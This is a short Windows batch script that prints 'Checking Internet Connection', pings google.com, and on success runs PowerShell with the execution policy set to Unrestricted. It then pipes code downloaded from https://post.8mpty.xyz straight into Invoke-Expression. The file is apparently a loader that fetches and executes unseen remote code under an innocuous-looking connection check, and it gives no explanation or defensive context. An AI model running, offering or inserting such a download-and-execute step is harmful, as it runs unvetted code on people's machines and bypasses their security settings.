@echo off
mode 67, 30

echo ===============================
echo  Checking Internet Connection
echo ===============================
ping 127.0.0.1 -n 2 -w 1000 > NUL

ping www.google.com -n 1 -w 1000 > NUL
if errorlevel 1 (goto nolaunch) else (goto launch)

:nolaunch
cls
echo No Internet Connection!!!
echo Exiting....
ping 127.0.0.1 -n 3 -w 1000 > NUL
goto end


:launch
cls
echo Connected!!
echo Running Script....
set ps=powershell.exe -NoProfile -ExecutionPolicy Unrestricted -Command "
%ps%irm https://post.8mpty.xyz | iex"
goto end


:end
exit /b